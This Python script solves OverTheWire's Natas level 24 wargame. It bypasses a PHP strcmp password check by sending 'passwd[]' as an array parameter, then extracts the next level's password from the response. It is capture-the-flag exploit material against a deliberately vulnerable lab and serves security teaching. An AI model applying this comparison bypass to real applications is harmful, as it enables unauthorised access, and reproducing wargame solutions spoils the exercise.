import requests
import sys
import argparse
import re
import time

# Function to perform login with basic authentication
def login(url, user, auth, session, proxies=None):
    print(f"[+] Logging in as {user}...")
    time.sleep(1)
    # Performing basic authentication with the "auth" argument.
    response = session.get(url, auth=auth, proxies=proxies)
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        time.sleep(1)

    else:
        print("[-] Failed to log in :(")
        print("[-] Exiting...")
        sys.exit(1)


# Function to extract the password from the response
def getpass(url, auth, session, proxies=None):
    print(f"[+] Getting the password...")
    time.sleep(1)

    url = url + "?passwd[]"
    response = session.get(url, auth=auth, proxies=proxies)
    content = response.text

    # Define regex pattern to find the password
    pattern = r'([A-Za-z0-9]{32})'
    # Using regex to search for password and extract it.
    passwd = (re.findall(pattern, content))
    print(f"[+] The password of natas25 is: {passwd[1]}")


def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas25 by exploiting the insecure 'strcmp in php.")
    parser.add_argument('-p', '--password', help='Password of natas24.', required=True, metavar='Password')
    parser.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    # Define URL and authentication credentials
    user = 'natas24'
    url = f'http://{user}.natas.labs.overthewire.org'
    url2 = f'http://{user}-experimenter.natas.labs.overthewire.org'
    auth = (user, args.password)
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    session = requests.Session()

    # Check if proxy option is enabled and perform login
    if args.proxy:
        login(url, user, auth, session,  proxies=proxies)
        getpass(url, auth, session, proxies=proxies)

    else:
        login(url, user, auth, session)
        getpass(url, auth, session)
    
if __name__ == "__main__":
    main()